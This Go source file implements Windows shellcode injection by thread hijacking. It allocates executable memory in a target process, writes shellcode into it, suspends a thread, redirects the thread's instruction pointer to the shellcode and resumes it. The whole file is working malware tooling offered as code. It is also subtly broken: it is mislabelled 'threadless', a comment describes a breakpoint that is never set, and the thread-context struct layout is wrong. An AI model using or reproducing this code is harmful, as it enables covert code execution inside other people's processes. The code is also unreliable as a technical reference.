package main

import (
	"fmt"
	"unsafe"
)

// doThreadlessInject finds a target thread, suspends it, overwrites its RIP
// to point to shellcode (allocated in the target process), then resumes.
// This avoids creating new threads in the target process.
func doThreadlessInject(hProc uintptr, pid uint32, sc []byte) error {
	// Allocate + write shellcode in target
	addr, _, _ := procVirtualAllocEx.Call(hProc, 0, uintptr(len(sc)),
		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_EXECUTE_READWRITE))
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}
	var w uintptr
	procWriteProcessMemory.Call(hProc, addr,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
		uintptr(unsafe.Pointer(&w)))

	// Snapshot threads to find one in the target process
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))
	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			hThread, _, _ := procOpenThread.Call(
				THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT,
				0, uintptr(te.th32ThreadID))
			if hThread == 0 {
				ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
				continue
			}

			// Suspend the thread
			procSuspendThread.Call(hThread)

			// Get thread context
			var ctx threadContext
			ctx.contextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS
			ret2, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
			if ret2 == 0 {
				procResumeThread.Call(hThread)
				procCloseHandle.Call(hThread)
				ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
				continue
			}

			ctx.rip = uint64(addr)

			// Set a hardware breakpoint on the original RIP so we can restore after
			// (actually for simplicity, after shellcode execution we won't restore -
			// the shellcode is expected to call ExitThread or similar)
			procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
			procResumeThread.Call(hThread)
			procCloseHandle.Call(hThread)
			return nil
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return fmt.Errorf("no suitable thread for threadless injection")
}

// Thread context structures for modifying RIP
type threadContext struct {
	p1home       uint64
	p2home       uint64
	p3home       uint64
	p4home       uint64
	p5home       uint64
	p6home       uint64
	contextFlags uint32
	mxCsr        uint32
	segCs        uint16
	segDs        uint16
	segEs        uint16
	segFs        uint16
	segGs        uint16
	segSs        uint16
	eFlags       uint32
	dr0          uint64
	dr1          uint64
	dr2          uint64
	dr3          uint64
	dr6          uint64
	dr7          uint64
	floatSave    [512]byte
	header       [4]uint64
	buffer       [8]uint64
	legacy       [10]uint64
	xmm0         [4]uint64
	xmm1         [4]uint64
	xmm2         [4]uint64
	xmm3         [4]uint64
	xmm4         [4]uint64
	xmm5         [4]uint64
	xmm6         [4]uint64
	xmm7         [4]uint64
	xmm8         [4]uint64
	xmm9         [4]uint64
	xmm10        [4]uint64
	xmm11        [4]uint64
	xmm12        [4]uint64
	xmm13        [4]uint64
	xmm14        [4]uint64
	xmm15        [4]uint64
	rip          uint64
}

const (
	CONTEXT_FULL           = 0x10007
	CONTEXT_DEBUG_REGISTERS = 0x00010
	THREAD_GET_CONTEXT     = 0x0008
	THREAD_SET_CONTEXT     = 0x0010
)
